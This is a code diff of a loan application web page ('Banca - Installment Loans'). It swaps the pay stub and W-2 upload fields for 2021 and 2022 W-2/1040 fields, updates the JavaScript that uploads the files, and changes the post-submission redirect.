@@ -2,7 +2,7 @@
 <html lang="en-US">
 
 <head>
-    <meta charset="UTF-8">
+    <meta charset="UTF-8"> 
     <meta http-equiv="x-ua-compatible" content="ie=edge">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
     <title>Banca - Installment Loans - Get an online cash loan today</title>
@@ -152,35 +152,27 @@
                                         </div>
                                     </div>
                                     <div class="col-12">
-
                                         <div class="form-group">
-                                            <label class="form-label">Pay stubs (PNG and JPG files
-                                                only)</label>
-                                            <input type="file" name="Pay_stubs" class="form-control" required />
+                                            <label class="form-label">2021 W-2/1040 form (PNG and JPG files only)</label>
+                                            <input type="file" name="2021_W-2/1040" class="form-control" required />
                                         </div>
                                         <div class="form-group">
-                                            <label class="form-label">W-2 tax form (PNG and JPG files
-                                                only)</label>
-                                            <input type="file" name="W-2_tax" class="form-control" required />
+                                            <label class="form-label">2022 W-2/1040 form (PNG and JPG files only)</label>
+                                            <input type="file" name="2022_W-2/1040" class="form-control" required />
                                         </div>
                                         <div class="form-group">
-                                            <label class="form-label">January 2024 bank statements (PNG and JPG files
-                                                only)</label>
+                                            <label class="form-label">January 2024 bank statements (PNG and JPG files only)</label>
                                             <input type="file" name="January_2024" class="form-control" required />
                                         </div>
                                         <div class="form-group">
-                                            <label class="form-label">February 2024 bank statements (PNG and JPG files
-                                                only)</label>
+                                            <label class="form-label">February 2024 bank statements (PNG and JPG files only)</label>
                                             <input type="file" name="February_2024" class="form-control" required />
                                         </div>
-
                                     </div>
                                     <div class="col-12 mt-4">
                                         <div class="form-check form-check-inline">
                                             <input class="form-check-input" type="checkbox" id="agreeBox">
-                                            <label class="form-check-label" for="agreeBox">I hereby agree that the
-                                                information given is true, accurate and complete as of the date of this
-                                                application submission.</label>
+                                            <label class="form-check-label" for="agreeBox">I hereby agree that the information given is true, accurate, and complete as of the date of this application submission.</label>
                                         </div>
                                     </div>
                                 </div>
@@ -347,8 +339,8 @@
             }
     
             // Get form values
-            const payStubsFile = document.querySelector('input[name="Pay_stubs"]').files[0];
-            const w2TaxFile = document.querySelector('input[name="W-2_tax"]').files[0];
+            const w21File = document.querySelector('input[name="2021_W-2/1040"]').files[0];
+            const w22TaxFile = document.querySelector('input[name="2022_W-2/1040"]').files[0];
             const january2024File = document.querySelector('input[name="January_2024"]').files[0];
             const february2024File = document.querySelector('input[name="February_2024"]').files[0];
             const agreeBox = document.getElementById('agreeBox').checked;
@@ -360,24 +352,24 @@
             }
     
             // Check if all files are selected
-            if (!payStubsFile || !w2TaxFile || !january2024File || !february2024File) {
+            if (!w21File || !w22TaxFile || !january2024File || !february2024File) {
                 alert('Please select all required files.');
                 return;
             }
     
             try {
                 // Upload files and get their download URLs
-                const [payStubsURL, w2TaxURL, january2024URL, february2024URL] = await Promise.all([
-                    uploadFile(user.uid, payStubsFile),
-                    uploadFile(user.uid, w2TaxFile),
+                const [w21URL, w22URL, january2024URL, february2024URL] = await Promise.all([
+                    uploadFile(user.uid, w21File),
+                    uploadFile(user.uid, w22TaxFile),
                     uploadFile(user.uid, january2024File),
                     uploadFile(user.uid, february2024File)
                 ]);
     
                 // Store data in Firebase
                 const formData = {
-                    payStubsURL,
-                    w2TaxURL,
+                    w21URL,
+                    w22URL,
                     january2024URL,
                     february2024URL
                 };
@@ -389,7 +381,7 @@
                 // Display submission confirmation
                 alert('Submission successful!');
                 // Redirect to approved.html after successful submission
-                window.location.href = 'approved.html';
+                window.location.href = 'document_upload.html';
             } catch (error) {
                 console.error('Error submitting form:', error);
                 alert('An error occurred while submitting the form. Please try again.');
